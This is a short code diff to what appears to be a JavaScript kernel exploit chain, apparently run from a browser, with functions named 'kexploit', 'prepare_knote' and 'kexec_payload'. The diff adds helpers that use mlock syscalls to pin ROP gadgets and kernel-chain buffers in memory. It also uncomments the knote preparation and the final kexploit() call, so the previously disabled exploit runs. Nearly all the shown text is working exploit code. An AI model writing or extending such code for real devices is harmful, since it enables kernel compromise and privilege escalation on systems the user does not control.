@@ -669,7 +669,30 @@ function test_rop(Chain) {
 debug_log('Chain900');
 test_rop(Chain);
 
-/*function prepare_knote(kchain) {
+function mlock_gadgets(gadgets) {
+    const chain = new Chain();
+
+    for (const [gadget, addr] of gadgets) {
+
+        const max_gadget_length = 0x50;
+        chain.push_syscall('mlock', addr, max_gadget_length);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+}
+
+function mlock_kchain(kchain) {
+    const chain = new Chain();
+    const stack_buffer = kchain.stack_buffer;
+    const stack_buffer_p = get_view_vector(new Uint8Array(stack_buffer));
+
+    chain.syscall('mlock', stack_buffer_p, stack_buffer.byteLength);
+    chain.syscall('mlock', kchain.retval_addr, kchain._return_value.length);
+    chain.syscall('mlock', kchain.jmp_buf_p, kchain.jmp_buf.length);
+}
+
+function prepare_knote(kchain) {
     const chain = new Chain();
     const size = 0x4000 * 4;
     // PROT_READ | PROT_WRITE
@@ -874,7 +897,7 @@ async function kexploit() {
     await kexec_payload(kchain, sd, mmap_area);
 }
 
-kexploit();*/
+kexploit();
 
 
 
